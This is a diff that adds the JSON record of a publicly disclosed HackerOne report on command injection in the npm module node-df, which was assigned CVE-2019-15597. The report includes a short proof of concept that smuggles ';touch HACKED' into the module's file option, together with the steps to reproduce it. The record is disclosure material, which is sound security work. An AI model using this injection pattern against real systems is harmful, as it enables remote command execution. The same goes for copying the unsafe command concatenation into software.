@@ -1,0 +1,138 @@
+{
+  "id": 703412,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDM0MTI=",
+  "url": "https://hackerone.com/reports/703412",
+  "title": "[node-df] RCE via insecure command concatenation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-09-28T09:11:41.085Z",
+  "submitted_at": "2019-09-28T09:11:41.085Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mik317",
+    "url": "/mik317",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/235/168/b1978368a15e57488f15b4f8aff454d3e3e98184_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2019-15597"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-12-04T19:33:22.380Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-12-04T19:33:13.799Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `RCE` issue in the `node-df` module.\nIt allows to execute `arbitrary commands remotely inside the victim's PC`\n\n# Module\n**module name:** `node-df`\n**version:** `0.1.4`\n**npm page:** `https://www.npmjs.com/package/node-df`\n\n## Module Description\n> node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.\n\n## Module Stats\n[N/A] downloads in the last day\n[3,023] downloads in the last week\n[N/A] downloads in the last month\n\n## Vulnerability Description\nThe issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: \n\n## Steps To Reproduce:\n1. Create the following PoC file:\n\n```js\n// poc.js\nvar df = require('node-df');\nvar options = {\n        file: '/;touch HACKED',\n        prefixMultiplier: 'GB',\n        isDisplayPrefixMultiplier: true,\n        precision: 2\n    };\n \ndf(options, function (error, response) {\n    if (error) { throw error; }\n \n    console.log(JSON.stringify(response, null, 2));\n});\n```\n1. Execute the following commands in terminal:\n\n```bash\nnpm i node-df # Install affected module\nls # Make sure there isn't any *HACKED* file\nnode poc.js #  Run the PoC\nls # The *HACKED* file has been created\n```\n1. The `HACKED` file will be created {F594172}\n\n## Patch\n> Don't concatenate `commands` using insecure `user's inputs` :)\n\n## Supporting Material/References:\n- [OPERATING SYSTEM VERSION]: Kali Linux\n- [NODEJS VERSION]: 10.16.3\n- [NPM VERSION]: 6.0.9\n\n# Wrap up\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\n`RCE` on `node-df` via `insecure command concatenation`",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 594172,
+      "file_name": "Screencast_09-28-2019_09_11_28_AM.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w5BGM5Y8pHCRWDVsinTwwDWv?response-content-disposition=attachment%3B%20filename%3D%22Screencast_09-28-2019_09_11_28_AM.webm%22%3B%20filename%2A%3DUTF-8%27%27Screencast_09-28-2019_09_11_28_AM.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWI2266%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T130815Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDtBAE1lb1WLJLQZdT0EDRj9GO2DBFGJHLf3urdqqZ10AIhAMXmbnZnesffskoL8C7VGqlKAPNP%2BeEVQYYy4Fi7QazvKrIFCBUQAxoMMDEzNjE5Mjc0ODQ5Igwz1rVJ0%2BcvTA2pr6oqjwWGQgSK5iuLs1kc%2B%2Fg0frYqYeXxES3LBjO6b3ipt7v%2F0VjNEvD1B%2Bu1%2BzKBQIt6FIegysMLgwi9oFlPY5DoFYknnh3O9bGgaPQdnCTc0QDCiCbJGItyDiiDQdYV3ze5bDON7wlb5fwpIKFtEWoArDUk5SAqe6ZI87DW5Cp96%2FtGekT5MeolStkhy8qjc8eDMT3V0MH8LGpP9MMz9FV26s8h8gOGuq7rT2l1nF8fMNs%2FbDSlWQNwP9eE2Ds9uARQHExNEcG%2FqE%2BSj%2Ba4s1POjMhfjdD0vCwWxygigxwrcLZsPNoCr6HG%2B3Y7wWO8MPr5vMlB%2BGxMFpo86Nt4Ocor4k7GRaays7BSQpBlE33RONcCXZn%2F3R7n5X0D%2Bj0xKN8aT1csXgFShuI%2BO%2BjXSmyEjVULtnec77sIdkTTayppJsPO0A2rU5%2FB2TJ5mb2kKYDBEuV4%2BNSuT5YNTwEm5pcXVJ0LEn4FzWcrm7cfswCH5OMTCuKPrv76M7lSumZT8a22%2FCcS78MTB4MKFwiFlx5De90eC9aZDAJH8VGyhl4mGgZk11jxQ%2Bj4J3saGkD6pTVZOIwSrDJMOp63mKdbscBINhA%2BZu8KyqFES88kQApC3PdW8xm8RbkzXPxBWS0BQOW7aYJkM5MDfbal%2BYCvKOyfRMUM45vbf2JKyfW%2F9St6i27CJkvX5ZCyjM%2BBpxGszgeaqHx%2BVRBHJOclm0bI98fmmL432svZDDHEGyDS01m2K6hDwo8%2BVOxySmXB13N9WYaydO2Vs%2FQNFdrvo5dROkTKiih8TopWZRzNMFeSUYDOFZ4U7vyUbTM4gLC6uEs27g7D6ZGrb%2F4tjOIpsZr%2FjDs%2FGcrgNlufN5%2BKopnlldQ8cGK8MPLBv8YGOrAB3OAoF9ew52vJKjXlJnV6fwioP6pMTMANcbq8QhPvE6TnkqV5Q5Pb0MvaJvldH%2BmFiwwcxlQAaLhP0OKmzMxu%2FCofM9DfcTMtsxsSPMD6p%2BH0wrVdSMB7tNkaTkPdBSosAW%2FPmW6rpZd9aYVNzepliJY0bbJ4Dc6%2BAdI5YEJA9Ap%2FvG0Ch9wwEIUKV0HExLknJVwSzLyPe8jPeVf%2BQhCfB1vyUL6HKY5VAxWwuQ9X%2Br8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0c1bb1a622ec43241951d0b0c814cab962760bbfec65d47db3b4a9b422db0fda",
+      "file_size": 178180,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-01-03T19:33:14.050Z",
+  "allow_singular_disclosure_after": -180380101.8976673,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "bl4de",
+    "eveeez",
+    "0x08",
+    "yoflow",
+    "kyramata"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 41074,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "node-df",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
